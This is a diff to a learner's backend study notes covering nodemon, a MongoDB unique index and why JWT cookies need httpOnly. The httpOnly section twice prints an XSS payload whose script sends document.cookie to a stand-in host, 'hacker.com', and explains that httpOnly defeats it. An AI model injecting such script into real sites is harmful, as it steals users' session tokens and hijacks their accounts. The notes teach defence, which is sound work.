@@ -1,3 +1,11 @@
+### RUNNING COMMANDS
+
+## BACKEND
+
+nodemon start - if this is given we dont need to stop and restart the server, after any changes in code and as soon as saved, it does that itself
+
+node src/app.js - in this command we have to do it manually
+
 npm i express
 
 running epress/node files node src/app.js
@@ -138,6 +146,73 @@ MongoDB finished creating the unique index
 Now duplicates are blocked at DB level
 
 So this error existed because i set unique:true was set after the db was created and some collections were added
+
+### Why httpOnlt:true ?
+
+In simp-le terms it does not allow javascript(frontend) to access the cookies
+if we dont put {httpOnly:true} here res.cookie("token", token);
+then, in website js console, document.cookie can simply expose our cookie by exposing JWT and with httpOnly, only server can access the cookie
+
+Real Attack Scenario (XSS Attack)
+
+Let’s say your site has a vulnerability:
+
+<input type="text" />
+
+Attacker injects:
+
+<script>
+  fetch("https://hacker.com/steal?cookie=" + document.cookie);
+</script>
+
+💥 What happens?
+document.cookie contains your JWT
+Hacker gets your token
+They can:
+Login as user
+Access private data
+Perform actions
+
+👉 This is called XSS (Cross-Site Scripting)
+
+✅ With httpOnly (SAFE)
+res.cookie("token", token, {
+httpOnly: true
+});
+
+Now:
+document.cookie
+token is NOT accessible
+
+🛡️ Same attack now fails
+
+<script>
+  fetch("https://hacker.com/steal?cookie=" + document.cookie);
+</script>
+
+Cookie NOT included
+Token stays safe
+
+🔥 Why this matters (VERY IMPORTANT)
+
+JWT is basically:
+
+🔑 Your identity
+
+If stolen:
+
+User account compromised
+Full access given
+🧠 Key Insight (Interview Gold)
+
+🔥 “httpOnly prevents client-side JavaScript from accessing cookies, protecting against XSS-based(cross site scripting) token theft.”
+
+⚠️ Important Clarification
+
+httpOnly does NOT protect against:
+
+CSRF attacks (need sameSite)
+Man-in-the-middle (need secure)
 
 ### Doubt
 
